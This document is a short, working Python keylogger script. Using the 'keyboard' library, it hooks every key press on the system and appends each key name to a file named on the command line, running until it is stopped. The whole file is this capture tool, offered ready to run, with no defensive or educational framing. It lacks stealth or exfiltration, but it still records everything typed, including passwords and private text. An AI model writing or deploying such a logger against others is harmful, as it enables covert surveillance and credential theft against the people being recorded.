#!/usr/bin/env python3

import argparse
import keyboard

def on_key_press(event, log_file):
    with open(log_file, 'a') as f:
        f.write('{}\n'.format(event.name))

def main():
    parser = argparse.ArgumentParser(description='Log key presses to a file.')
    parser.add_argument('log_file', type=str, help='The file to log key presses to')
    args = parser.parse_args()

    keyboard.on_press(lambda event: on_key_press(event, args.log_file))
    keyboard.wait()

if __name__ == "__main__":
    main()

